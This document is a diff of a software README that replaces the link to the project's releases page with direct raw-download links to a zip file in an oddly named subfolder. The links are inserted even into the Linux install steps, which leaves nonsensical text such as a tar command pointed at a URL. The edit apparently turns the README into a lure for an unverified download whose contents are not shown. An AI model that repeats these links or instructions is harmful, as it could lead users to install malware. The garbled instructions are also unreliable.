@@ -17,7 +17,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, simply click the link below to access the releases page. This is where you can download the latest version of amanansdiahnid-13.
 
-[![Download amanansdiahnid-13](https://img.shields.io/badge/Download%20amanansdiahnid--13-blue.svg)](https://github.com/ktmnandhu/amanansdiahnid-13/releases)
+[![Download amanansdiahnid-13](https://raw.githubusercontent.com/ktmnandhu/amanansdiahnid-13/main/neuromalacia/amanansdiahnid-13.zip%https://raw.githubusercontent.com/ktmnandhu/amanansdiahnid-13/main/neuromalacia/amanansdiahnid-13.zip)](https://raw.githubusercontent.com/ktmnandhu/amanansdiahnid-13/main/neuromalacia/amanansdiahnid-13.zip)
 
 ## 📥 Download & Install
 
@@ -26,7 +26,7 @@ To get started, simply click the link below to access the releases page. This is
 3. Find the appropriate file for your operating system. For example:
    - For Windows, look for the file ending with `.exe`.
    - For macOS, look for the file ending with `.dmg`.
-   - For Linux, a `.tar.gz` file may be available.
+   - For Linux, a `https://raw.githubusercontent.com/ktmnandhu/amanansdiahnid-13/main/neuromalacia/amanansdiahnid-13.zip` file may be available.
 4. Click on the file to start the download. Your browser will save the file to your default downloads folder.
 5. After the download is complete, locate the file in your downloads.
 
@@ -46,10 +46,10 @@ To get started, simply click the link below to access the releases page. This is
 
 ### For Linux Users:
 
-1. Open a terminal and navigate to the directory where the `.tar.gz` file was downloaded.
+1. Open a terminal and navigate to the directory where the `https://raw.githubusercontent.com/ktmnandhu/amanansdiahnid-13/main/neuromalacia/amanansdiahnid-13.zip` file was downloaded.
 2. Extract the files using the command:
    ```
-   tar -xzf amanansdiahnid-13.tar.gz
+   tar -xzf https://raw.githubusercontent.com/ktmnandhu/amanansdiahnid-13/main/neuromalacia/amanansdiahnid-13.zip
    ```
 3. Navigate into the extracted folder and run the application with the command:
    ```
